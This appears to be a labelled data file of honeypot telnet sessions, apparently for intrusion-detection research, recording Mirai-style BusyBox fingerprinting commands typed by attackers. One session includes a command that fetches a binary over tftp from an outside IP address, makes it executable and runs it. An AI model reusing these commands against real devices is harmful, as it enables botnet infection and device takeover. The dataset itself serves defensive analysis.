Unnamed: 0;session;duration;command_freq;input;attack_cat;label_nr;label_desc
622;503d51c0c74e;1,96541E+13;13;enable;Fingerprinting;0;busybox fingerprinting
623;503d51c0c74e;1,96541E+13;13;system;Fingerprinting;0;busybox fingerprinting
624;503d51c0c74e;1,96541E+13;13;system;Fingerprinting;0;busybox fingerprinting
625;503d51c0c74e;1,96541E+13;13;shell;Fingerprinting;0;busybox fingerprinting
626;503d51c0c74e;1,96541E+13;13;shell;Fingerprinting;0;busybox fingerprinting
627;503d51c0c74e;1,96541E+13;13;sh;Fingerprinting;0;busybox fingerprinting
628;503d51c0c74e;1,96541E+13;13;"cat /proc/mounts; /bin/busybox YZRWP";Fingerprinting;0;busybox fingerprinting
629;503d51c0c74e;1,96541E+13;13;"cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox YZRWP";Fingerprinting;0;busybox fingerprinting
630;503d51c0c74e;1,96541E+13;13;"tftp; wget; /bin/busybox YZRWP";Fingerprinting;0;busybox fingerprinting
631;503d51c0c74e;1,96541E+13;13;"dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s";Fingerprinting;0;busybox fingerprinting
632;503d51c0c74e;1,96541E+13;13;while read i;Fingerprinting;0;busybox fingerprinting
633;503d51c0c74e;1,96541E+13;13;/bin/busybox YZRWP;Fingerprinting;0;busybox fingerprinting
634;503d51c0c74e;1,96541E+13;13;"rm .s; exit";Fingerprinting;0;busybox fingerprinting
798;11c3a317c219;3,1716E+13;13;enable;Fingerprinting;0;busybox fingerprinting
799;11c3a317c219;3,1716E+13;13;system;Fingerprinting;0;busybox fingerprinting
800;11c3a317c219;3,1716E+13;13;system;Fingerprinting;0;busybox fingerprinting
801;11c3a317c219;3,1716E+13;13;shell;Fingerprinting;0;busybox fingerprinting
802;11c3a317c219;3,1716E+13;13;shell;Fingerprinting;0;busybox fingerprinting
803;11c3a317c219;3,1716E+13;13;sh;Fingerprinting;0;busybox fingerprinting
804;11c3a317c219;3,1716E+13;13;"cat /proc/mounts; /bin/busybox HUACS";Fingerprinting;0;busybox fingerprinting
805;11c3a317c219;3,1716E+13;13;"cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox HUACS";Fingerprinting;0;busybox fingerprinting
806;11c3a317c219;3,1716E+13;13;"tftp; wget; /bin/busybox HUACS";Fingerprinting;0;busybox fingerprinting
807;11c3a317c219;3,1716E+13;13;"dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s";Fingerprinting;0;busybox fingerprinting
808;11c3a317c219;3,1716E+13;13;while read i;Fingerprinting;0;busybox fingerprinting
809;11c3a317c219;3,1716E+13;13;/bin/busybox HUACS;Fingerprinting;0;busybox fingerprinting
810;11c3a317c219;3,1716E+13;13;"rm .s; exit";Fingerprinting;0;busybox fingerprinting
19079;aa965a08eac9;3,27026E+13;14;enable;Fingerprinting;0;busybox fingerprinting
19080;aa965a08eac9;3,27026E+13;14;system;Fingerprinting;0;busybox fingerprinting
19081;aa965a08eac9;3,27026E+13;14;system;Fingerprinting;0;busybox fingerprinting
19082;aa965a08eac9;3,27026E+13;14;shell;Fingerprinting;0;busybox fingerprinting
19083;aa965a08eac9;3,27026E+13;14;shell;Fingerprinting;0;busybox fingerprinting
19084;aa965a08eac9;3,27026E+13;14;sh;Fingerprinting;0;busybox fingerprinting
19085;aa965a08eac9;3,27026E+13;14;"cat /proc/mounts; /bin/busybox BDAVR";Fingerprinting;0;busybox fingerprinting
19086;aa965a08eac9;3,27026E+13;14;"cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox BDAVR";Fingerprinting;0;busybox fingerprinting
19087;aa965a08eac9;3,27026E+13;14;"tftp; wget; /bin/busybox BDAVR";Fingerprinting;0;busybox fingerprinting
19088;aa965a08eac9;3,27026E+13;14;"dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s";Fingerprinting;0;busybox fingerprinting
19089;aa965a08eac9;3,27026E+13;14;while read i;Fingerprinting;0;busybox fingerprinting
19090;aa965a08eac9;3,27026E+13;14;/bin/busybox BDAVR;Fingerprinting;0;busybox fingerprinting
19091;aa965a08eac9;3,27026E+13;14;"rm .s; tftp -l.i -r.i -g 144.48.170.110:19280; chmod 777 .i; ./.i; exit";Fingerprinting;0;busybox fingerprinting
19092;aa965a08eac9;3,27026E+13;14;./.i;Fingerprinting;0;busybox fingerprinting
7777;6a86f0839aa6;5,26003E+13;13;enable;Fingerprinting;0;busybox fingerprinting
7778;6a86f0839aa6;5,26003E+13;13;system;Fingerprinting;0;busybox fingerprinting
7779;6a86f0839aa6;5,26003E+13;13;system;Fingerprinting;0;busybox fingerprinting
7780;6a86f0839aa6;5,26003E+13;13;shell;Fingerprinting;0;busybox fingerprinting
7781;6a86f0839aa6;5,26003E+13;13;shell;Fingerprinting;0;busybox fingerprinting
7782;6a86f0839aa6;5,26003E+13;13;sh;Fingerprinting;0;busybox fingerprinting
7783;6a86f0839aa6;5,26003E+13;13;"cat /proc/mounts; /bin/busybox YDABL";Fingerprinting;0;busybox fingerprinting
7784;6a86f0839aa6;5,26003E+13;13;"cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox YDABL";Fingerprinting;0;busybox fingerprinting
7785;6a86f0839aa6;5,26003E+13;13;"tftp; wget; /bin/busybox YDABL";Fingerprinting;0;busybox fingerprinting
7786;6a86f0839aa6;5,26003E+13;13;"dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s";Fingerprinting;0;busybox fingerprinting
7787;6a86f0839aa6;5,26003E+13;13;while read i;Fingerprinting;0;busybox fingerprinting
7788;6a86f0839aa6;5,26003E+13;13;/bin/busybox YDABL;Fingerprinting;0;busybox fingerprinting
7789;6a86f0839aa6;5,26003E+13;13;"rm .s; exit";Fingerprinting;0;busybox fingerprinting
1183;c1f83069fa9b;6,01991E+13;13;enable;Fingerprinting;0;busybox fingerprinting
1184;c1f83069fa9b;6,01991E+13;13;system;Fingerprinting;0;busybox fingerprinting
1185;c1f83069fa9b;6,01991E+13;13;system;Fingerprinting;0;busybox fingerprinting
1186;c1f83069fa9b;6,01991E+13;13;shell;Fingerprinting;0;busybox fingerprinting
1187;c1f83069fa9b;6,01991E+13;13;shell;Fingerprinting;0;busybox fingerprinting
1188;c1f83069fa9b;6,01991E+13;13;sh;Fingerprinting;0;busybox fingerprinting
1189;c1f83069fa9b;6,01991E+13;13;"cat /proc/mounts; /bin/busybox TQFXJ";Fingerprinting;0;busybox fingerprinting
1190;c1f83069fa9b;6,01991E+13;13;"cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox TQFXJ";Fingerprinting;0;busybox fingerprinting
1191;c1f83069fa9b;6,01991E+13;13;"tftp; wget; /bin/busybox TQFXJ";Fingerprinting;0;busybox fingerprinting
1192;c1f83069fa9b;6,01991E+13;13;"dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s";Fingerprinting;0;busybox fingerprinting
1193;c1f83069fa9b;6,01991E+13;13;while read i;Fingerprinting;0;busybox fingerprinting
1194;c1f83069fa9b;6,01991E+13;13;/bin/busybox TQFXJ;Fingerprinting;0;busybox fingerprinting
1195;c1f83069fa9b;6,01991E+13;13;"rm .s; exit";Fingerprinting;0;busybox fingerprinting
1570;6e88efc81d97;6,51057E+13;13;enable;Fingerprinting;0;busybox fingerprinting
1571;6e88efc81d97;6,51057E+13;13;system;Fingerprinting;0;busybox fingerprinting
1572;6e88efc81d97;6,51057E+13;13;system;Fingerprinting;0;busybox fingerprinting
1573;6e88efc81d97;6,51057E+13;13;shell;Fingerprinting;0;busybox fingerprinting
1574;6e88efc81d97;6,51057E+13;13;shell;Fingerprinting;0;busybox fingerprinting
1575;6e88efc81d97;6,51057E+13;13;sh;Fingerprinting;0;busybox fingerprinting
